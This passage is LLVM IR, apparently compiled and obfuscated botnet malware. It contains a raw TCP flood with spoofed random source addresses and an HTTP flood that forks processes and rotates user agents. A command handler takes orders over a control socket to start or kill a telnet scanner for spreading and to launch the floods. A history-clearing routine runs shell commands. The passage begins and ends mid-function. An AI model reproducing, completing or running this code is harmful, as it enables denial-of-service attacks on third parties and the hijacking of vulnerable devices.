  %295 = and i16 %294, %293
  %296 = and i16 %288, -1025
  %297 = and i16 %295, 1024
  %298 = xor i16 %295, 1024
  %299 = or i16 %297, %298
  %300 = or i16 %295, 1024
  store i16 %299, i16* %287, align 4
  br label %403

; <label>:301:                                    ; preds = %279
  %302 = load i8*, i8** %23, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.300, i32 0, i32 0)) #9
  %304 = icmp ne i32 %303, 0
  br i1 %304, label %331, label %305

; <label>:305:                                    ; preds = %301
  %306 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %307 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %306, i32 0, i32 0
  %308 = bitcast %union.anon* %307 to %struct.anon.0*
  %309 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %308, i32 0, i32 4
  %310 = load i16, i16* %309, align 4
  %311 = xor i16 -257, -1
  %312 = xor i16 %310, %311
  %313 = and i16 %312, %310
  %314 = and i16 %310, -257
  %315 = xor i16 %313, -1
  %316 = xor i16 256, -1
  %317 = xor i16 -4586, -1
  %318 = and i16 %315, -4586
  %319 = and i16 %313, %317
  %320 = and i16 %316, -4586
  %321 = and i16 256, %317
  %322 = or i16 %318, %319
  %323 = or i16 %320, %321
  %324 = xor i16 %322, %323
  %325 = or i16 %315, %316
  %326 = xor i16 %325, -1
  %327 = or i16 -4586, %317
  %328 = and i16 %326, %327
  %329 = or i16 %324, %328
  %330 = or i16 %313, 256
  store i16 %329, i16* %309, align 4
  br label %402

; <label>:331:                                    ; preds = %301
  %332 = load i8*, i8** %23, align 8
  %333 = call i32 @strcmp(i8* %332, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.301, i32 0, i32 0)) #9
  %334 = icmp ne i32 %333, 0
  br i1 %334, label %365, label %335

; <label>:335:                                    ; preds = %331
  %336 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %337 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %336, i32 0, i32 0
  %338 = bitcast %union.anon* %337 to %struct.anon.0*
  %339 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %338, i32 0, i32 4
  %340 = load i16, i16* %339, align 4
  %341 = xor i16 %340, -1
  %342 = xor i16 -4097, -1
  %343 = xor i16 -21907, -1
  %344 = or i16 %341, %342
  %345 = or i16 -21907, %343
  %346 = xor i16 %344, -1
  %347 = and i16 %346, %345
  %348 = and i16 %340, -4097
  %349 = xor i16 %347, -1
  %350 = xor i16 4096, -1
  %351 = xor i16 -29213, -1
  %352 = and i16 %349, -29213
  %353 = and i16 %347, %351
  %354 = and i16 %350, -29213
  %355 = and i16 4096, %351
  %356 = or i16 %352, %353
  %357 = or i16 %354, %355
  %358 = xor i16 %356, %357
  %359 = or i16 %349, %350
  %360 = xor i16 %359, -1
  %361 = or i16 -29213, %351
  %362 = and i16 %360, %361
  %363 = or i16 %358, %362
  %364 = or i16 %347, 4096
  store i16 %363, i16* %339, align 4
  br label %401

; <label>:365:                                    ; preds = %331
  %366 = load i8*, i8** %23, align 8
  %367 = call i32 @strcmp(i8* %366, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.302, i32 0, i32 0)) #9
  %368 = icmp ne i32 %367, 0
  br i1 %368, label %399, label %369

; <label>:369:                                    ; preds = %365
  %370 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 0
  %372 = bitcast %union.anon* %371 to %struct.anon.0*
  %373 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %372, i32 0, i32 4
  %374 = load i16, i16* %373, align 4
  %375 = xor i16 %374, -1
  %376 = xor i16 -2049, -1
  %377 = xor i16 -13915, -1
  %378 = or i16 %375, %376
  %379 = or i16 -13915, %377
  %380 = xor i16 %378, -1
  %381 = and i16 %380, %379
  %382 = and i16 %374, -2049
  %383 = xor i16 %381, -1
  %384 = xor i16 2048, -1
  %385 = xor i16 24818, -1
  %386 = and i16 %383, 24818
  %387 = and i16 %381, %385
  %388 = and i16 %384, 24818
  %389 = and i16 2048, %385
  %390 = or i16 %386, %387
  %391 = or i16 %388, %389
  %392 = xor i16 %390, %391
  %393 = or i16 %383, %384
  %394 = xor i16 %393, -1
  %395 = or i16 24818, %385
  %396 = and i16 %394, %395
  %397 = or i16 %392, %396
  %398 = or i16 %381, 2048
  store i16 %397, i16* %373, align 4
  br label %400

; <label>:399:                                    ; preds = %365
  br label %400

; <label>:400:                                    ; preds = %399, %369
  br label %401

; <label>:401:                                    ; preds = %400, %335
  br label %402

; <label>:402:                                    ; preds = %401, %305
  br label %403

; <label>:403:                                    ; preds = %402, %283
  br label %404

; <label>:404:                                    ; preds = %403, %265
  %405 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i32 0, i32 0)) #5
  store i8* %405, i8** %23, align 8
  br label %258

; <label>:406:                                    ; preds = %258
  br label %407

; <label>:407:                                    ; preds = %406, %137
  %408 = call i32 @rand_cmwc()
  %409 = trunc i32 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon* %411 to %struct.anon.0*
  %413 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %412, i32 0, i32 5
  store i16 %409, i16* %413, align 2
  %414 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i32 0, i32 0
  %416 = bitcast %union.anon* %415 to %struct.anon.0*
  %417 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %419 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %418, i32 0, i32 0
  %420 = bitcast %union.anon* %419 to %struct.anon.0*
  %421 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %420, i32 0, i32 7
  store i16 0, i16* %421, align 2
  %422 = load i32, i32* %9, align 4
  %423 = icmp eq i32 %422, 0
  br i1 %423, label %424, label %426

; <label>:424:                                    ; preds = %407
  %425 = call i32 @rand_cmwc()
  br label %431

; <label>:426:                                    ; preds = %407
  %427 = load i32, i32* %9, align 4
  %428 = trunc i32 %427 to i16
  %429 = call zeroext i16 @htons(i16 zeroext %428) #10
  %430 = zext i16 %429 to i32
  br label %431

; <label>:431:                                    ; preds = %426, %424
  %432 = phi i32 [ %425, %424 ], [ %430, %426 ]
  %433 = trunc i32 %432 to i16
  %434 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %435 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %434, i32 0, i32 0
  %436 = bitcast %union.anon* %435 to %struct.anon.0*
  %437 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %436, i32 0, i32 1
  store i16 %433, i16* %437, align 2
  %438 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %439 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %440 = call zeroext i16 @tcpcsum(%struct.iphdr* %438, %struct.tcphdr* %439)
  %441 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 0
  %443 = bitcast %union.anon* %442 to %struct.anon.0*
  %444 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %443, i32 0, i32 6
  store i16 %440, i16* %444, align 4
  %445 = bitcast i8* %86 to i16*
  %446 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 2
  %448 = load i16, i16* %447, align 2
  %449 = zext i16 %448 to i32
  %450 = call zeroext i16 @csum(i16* %445, i32 %449)
  %451 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 7
  store i16 %450, i16* %452, align 2
  %453 = call i64 @time(i64* null) #5
  %454 = load i32, i32* %10, align 4
  %455 = sext i32 %454 to i64
  %456 = sub i64 %453, -3875254620916884808
  %457 = add i64 %456, %455
  %458 = add i64 %457, -3875254620916884808
  %459 = add nsw i64 %453, %455
  %460 = trunc i64 %458 to i32
  store i32 %460, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %461

; <label>:461:                                    ; preds = %515, %514, %431
  br label %462

; <label>:462:                                    ; preds = %461
  %463 = load i32, i32* %17, align 4
  %464 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %465 = call i64 @sendto(i32 %463, i8* %86, i64 %83, i32 0, %struct.sockaddr* %464, i32 16)
  %466 = load i32, i32* %19, align 4
  %467 = call i32 @getRandomIP(i32 %466)
  %468 = call i32 @htonl(i32 %467) #10
  %469 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 8
  store i32 %468, i32* %470, align 4
  %471 = call i32 @rand_cmwc()
  %472 = trunc i32 %471 to i16
  %473 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 3
  store i16 %472, i16* %474, align 4
  %475 = call i32 @rand_cmwc()
  %476 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %477 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %476, i32 0, i32 0
  %478 = bitcast %union.anon* %477 to %struct.anon.0*
  %479 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %478, i32 0, i32 2
  store i32 %475, i32* %479, align 4
  %480 = call i32 @rand_cmwc()
  %481 = trunc i32 %480 to i16
  %482 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %483 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %482, i32 0, i32 0
  %484 = bitcast %union.anon* %483 to %struct.anon.0*
  %485 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %484, i32 0, i32 0
  store i16 %481, i16* %485, align 4
  %486 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 0
  %488 = bitcast %union.anon* %487 to %struct.anon.0*
  %489 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %488, i32 0, i32 6
  store i16 0, i16* %489, align 4
  %490 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %491 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %492 = call zeroext i16 @tcpcsum(%struct.iphdr* %490, %struct.tcphdr* %491)
  %493 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %494 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %493, i32 0, i32 0
  %495 = bitcast %union.anon* %494 to %struct.anon.0*
  %496 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %495, i32 0, i32 6
  store i16 %492, i16* %496, align 4
  %497 = bitcast i8* %86 to i16*
  %498 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 2
  %500 = load i16, i16* %499, align 2
  %501 = zext i16 %500 to i32
  %502 = call zeroext i16 @csum(i16* %497, i32 %501)
  %503 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %504 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %503, i32 0, i32 7
  store i16 %502, i16* %504, align 2
  %505 = load i32, i32* %25, align 4
  %506 = load i32, i32* %15, align 4
  %507 = icmp eq i32 %505, %506
  br i1 %507, label %508, label %515

; <label>:508:                                    ; preds = %462
  %509 = call i64 @time(i64* null) #5
  %510 = load i32, i32* %24, align 4
  %511 = sext i32 %510 to i64
  %512 = icmp sgt i64 %509, %511
  br i1 %512, label %513, label %514

; <label>:513:                                    ; preds = %508
  br label %520

; <label>:514:                                    ; preds = %508
  store i32 0, i32* %25, align 4
  br label %461

; <label>:515:                                    ; preds = %462
  %516 = load i32, i32* %25, align 4
  %517 = sub i32 0, 1
  %518 = sub i32 %516, %517
  %519 = add i32 %516, 1
  store i32 %518, i32* %25, align 4
  br label %461

; <label>:520:                                    ; preds = %513
  %521 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %521)
  br label %522

; <label>:522:                                    ; preds = %520, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = sub i64 0, %21
  %23 = sub i64 %19, %22
  %24 = add nsw i64 %19, %21
  %25 = trunc i64 %23 to i32
  store i32 %25, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %26

; <label>:26:                                     ; preds = %69, %6
  %27 = load i32, i32* %14, align 4
  %28 = load i32, i32* %12, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %74

; <label>:30:                                     ; preds = %26
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %32 = load i8*, i8** %7, align 8
  %33 = load i8*, i8** %10, align 8
  %34 = load i8*, i8** %8, align 8
  %35 = call i32 @rand() #5
  %36 = srem i32 %35, 36
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %37
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, i8*, ...) @sprintf(i8* %31, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.303, i32 0, i32 0), i8* %32, i8* %33, i8* %34, i8* %39) #5
  %41 = call i32 @fork() #5
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %68

; <label>:43:                                     ; preds = %30
  br label %44

; <label>:44:                                     ; preds = %66, %43
  %45 = load i32, i32* %15, align 4
  %46 = sext i32 %45 to i64
  %47 = call i64 @time(i64* null) #5
  %48 = icmp sgt i64 %46, %47
  br i1 %48, label %49, label %67

; <label>:49:                                     ; preds = %44
  %50 = load i8*, i8** %8, align 8
  %51 = load i16, i16* %9, align 2
  %52 = call i32 @socket_connect(i8* %50, i16 zeroext %51)
  store i32 %52, i32* %13, align 4
  %53 = load i32, i32* %13, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %66

; <label>:55:                                     ; preds = %49
  %56 = load i32, i32* %13, align 4
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = call i64 @strlen(i8* %58) #9
  %60 = call i64 @write(i32 %56, i8* %57, i64 %59)
  %61 = load i32, i32* %13, align 4
  %62 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %63 = call i64 @read(i32 %61, i8* %62, i64 1)
  %64 = load i32, i32* %13, align 4
  %65 = call i32 @close(i32 %64)
  br label %66

; <label>:66:                                     ; preds = %55, %49
  br label %44

; <label>:67:                                     ; preds = %44
  call void @exit(i32 0) #12
  unreachable

; <label>:68:                                     ; preds = %30
  br label %69

; <label>:69:                                     ; preds = %68
  %70 = load i32, i32* %14, align 4
  %71 = sub i32 0, 1
  %72 = sub i32 %70, %71
  %73 = add nsw i32 %70, 1
  store i32 %72, i32* %14, align 4
  br label %26

; <label>:74:                                     ; preds = %26
  ret void
}

declare i64 @read(i32, i8*, i64) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.304, i32 0, i32 0))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i32 0, i32 0)) #9
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %38, label %37

; <label>:37:                                     ; preds = %2
  br label %560

; <label>:38:                                     ; preds = %2
  %39 = load i8**, i8*** %4, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strcmp(i8* %41, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.306, i32 0, i32 0)) #9
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %164, label %44

; <label>:44:                                     ; preds = %38
  %45 = load i8**, i8*** %4, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i32 0, i32 0)) #9
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %121, label %50

; <label>:50:                                     ; preds = %44
  %51 = call i32 @fork() #5
  store i32 %51, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %52 = call i64 @sysconf(i32 84) #5
  %53 = trunc i64 %52 to i32
  store i32 %53, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %54 = load i32, i32* %7, align 4
  %55 = icmp eq i32 %54, 1
  br i1 %55, label %56, label %57

; <label>:56:                                     ; preds = %50
  store i32 500, i32* %8, align 4
  br label %57

; <label>:57:                                     ; preds = %56, %50
  %58 = load i32, i32* %7, align 4
  %59 = icmp sge i32 %58, 2
  br i1 %59, label %60, label %61

; <label>:60:                                     ; preds = %57
  store i32 1000, i32* %8, align 4
  br label %61

; <label>:61:                                     ; preds = %60, %57
  %62 = load i32, i32* %5, align 4
  %63 = icmp ugt i32 %62, 0
  br i1 %63, label %64, label %66

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %5, align 4
  store i32 %65, i32* @scanPid, align 4
  br label %560

; <label>:66:                                     ; preds = %61
  %67 = load i32, i32* %5, align 4
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %66
  br label %560

; <label>:70:                                     ; preds = %66
  br label %71

; <label>:71:                                     ; preds = %70
  store i32 0, i32* %6, align 4
  br label %72

; <label>:72:                                     ; preds = %114, %71
  %73 = load i32, i32* %6, align 4
  %74 = load i32, i32* %7, align 4
  %75 = icmp slt i32 %73, %74
  br i1 %75, label %76, label %120

; <label>:76:                                     ; preds = %72
  %77 = call i64 @time(i64* null) #5
  %78 = call i32 @getpid() #5
  %79 = sext i32 %78 to i64
  %80 = xor i64 %77, -1
  %81 = and i64 -2680302751221210950, %80
  %82 = xor i64 -2680302751221210950, -1
  %83 = and i64 %77, %82
  %84 = xor i64 %79, -1
  %85 = and i64 %84, -2680302751221210950
  %86 = and i64 %79, %82
  %87 = or i64 %81, %83
  %88 = or i64 %85, %86
  %89 = xor i64 %87, %88
  %90 = xor i64 %77, %79
  %91 = call i32 @getppid() #5
  %92 = sext i32 %91 to i64
  %93 = add i64 %89, -5847501504829067656
  %94 = add i64 %93, %92
  %95 = sub i64 %94, -5847501504829067656
  %96 = add nsw i64 %89, %92
  %97 = trunc i64 %95 to i32
  call void @srand(i32 %97) #5
  %98 = call i64 @time(i64* null) #5
  %99 = call i32 @getpid() #5
  %100 = sext i32 %99 to i64
  %101 = xor i64 %98, -1
  %102 = and i64 8661370279510048947, %101
  %103 = xor i64 8661370279510048947, -1
  %104 = and i64 %98, %103
  %105 = xor i64 %100, -1
  %106 = and i64 %105, 8661370279510048947
  %107 = and i64 %100, %103
  %108 = or i64 %102, %104
  %109 = or i64 %106, %107
  %110 = xor i64 %108, %109
  %111 = xor i64 %98, %100
  %112 = trunc i64 %110 to i32
  call void @init_rand(i32 %112)
  %113 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %113)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 %115, 748205922
  %117 = add i32 %116, 1
  %118 = add i32 %117, 748205922
  %119 = add nsw i32 %115, 1
  store i32 %118, i32* %6, align 4
  br label %72

; <label>:120:                                    ; preds = %72
  br label %121

; <label>:121:                                    ; preds = %120, %44
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 1
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @strcmp(i8* %124, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.308, i32 0, i32 0)) #9
  %126 = icmp ne i32 %125, 0
  br i1 %126, label %134, label %127

; <label>:127:                                    ; preds = %121
  %128 = load i32, i32* @scanPid, align 4
  %129 = icmp eq i32 %128, 0
  br i1 %129, label %130, label %131

; <label>:130:                                    ; preds = %127
  br label %560

; <label>:131:                                    ; preds = %127
  %132 = load i32, i32* @scanPid, align 4
  %133 = call i32 @kill(i32 %132, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %134

; <label>:134:                                    ; preds = %131, %121
  %135 = load i8**, i8*** %4, align 8
  %136 = getelementptr inbounds i8*, i8** %135, i64 1
  %137 = load i8*, i8** %136, align 8
  %138 = call i32 @strcmp(i8* %137, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.309, i32 0, i32 0)) #9
  %139 = icmp ne i32 %138, 0
  br i1 %139, label %163, label %140

; <label>:140:                                    ; preds = %134
  %141 = load i32, i32* %3, align 4
  %142 = icmp slt i32 %141, 3
  br i1 %142, label %143, label %146

; <label>:143:                                    ; preds = %140
  %144 = load i32, i32* @mainCommSock, align 4
  %145 = call i32 (i32, i8*, ...) @sockprintf(i32 %144, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.310, i32 0, i32 0))
  br label %560

; <label>:146:                                    ; preds = %140
  %147 = load i8**, i8*** %4, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 1
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149) #9
  store i32 %150, i32* %9, align 4
  %151 = load i8**, i8*** %4, align 8
  %152 = getelementptr inbounds i8*, i8** %151, i64 2
  %153 = load i8*, i8** %152, align 8
  %154 = call i32 @atoi(i8* %153) #9
  store i32 %154, i32* %10, align 4
  %155 = call i32 @listFork()
  %156 = icmp ne i32 %155, 0
  br i1 %156, label %162, label %157

; <label>:157:                                    ; preds = %146
  %158 = load i32, i32* @mainCommSock, align 4
  %159 = call i32 (i32, i8*, ...) @sockprintf(i32 %158, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.311, i32 0, i32 0))
  %160 = load i32, i32* %10, align 4
  %161 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %160, i32 %161)
  call void @_exit(i32 0) #11
  unreachable

; <label>:162:                                    ; preds = %146
  br label %560

; <label>:163:                                    ; preds = %134
  br label %164

; <label>:164:                                    ; preds = %163, %38
  %165 = load i8**, i8*** %4, align 8
  %166 = getelementptr inbounds i8*, i8** %165, i64 0
  %167 = load i8*, i8** %166, align 8
  %168 = call i32 @strcmp(i8* %167, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.312, i32 0, i32 0)) #9
  %169 = icmp ne i32 %168, 0
  br i1 %169, label %213, label %170

; <label>:170:                                    ; preds = %164
  %171 = load i32, i32* %3, align 4
  %172 = icmp slt i32 %171, 6
  br i1 %172, label %185, label %173

; <label>:173:                                    ; preds = %170
  %174 = load i8**, i8*** %4, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 3
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 @atoi(i8* %176) #9
  %178 = icmp slt i32 %177, 1
  br i1 %178, label %185, label %179

; <label>:179:                                    ; preds = %173
  %180 = load i8**, i8*** %4, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 5
  %182 = load i8*, i8** %181, align 8
  %183 = call i32 @atoi(i8* %182) #9
  %184 = icmp slt i32 %183, 1
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %179, %173, %170
  br label %560

; <label>:186:                                    ; preds = %179
  %187 = call i32 @listFork()
  %188 = icmp ne i32 %187, 0
  br i1 %188, label %189, label %190

; <label>:189:                                    ; preds = %186
  br label %560

; <label>:190:                                    ; preds = %186
  %191 = load i8**, i8*** %4, align 8
  %192 = getelementptr inbounds i8*, i8** %191, i64 1
  %193 = load i8*, i8** %192, align 8
  %194 = load i8**, i8*** %4, align 8
  %195 = getelementptr inbounds i8*, i8** %194, i64 2
  %196 = load i8*, i8** %195, align 8
  %197 = load i8**, i8*** %4, align 8
  %198 = getelementptr inbounds i8*, i8** %197, i64 3
  %199 = load i8*, i8** %198, align 8
  %200 = call i32 @atoi(i8* %199) #9
  %201 = trunc i32 %200 to i16
  %202 = load i8**, i8*** %4, align 8
  %203 = getelementptr inbounds i8*, i8** %202, i64 4
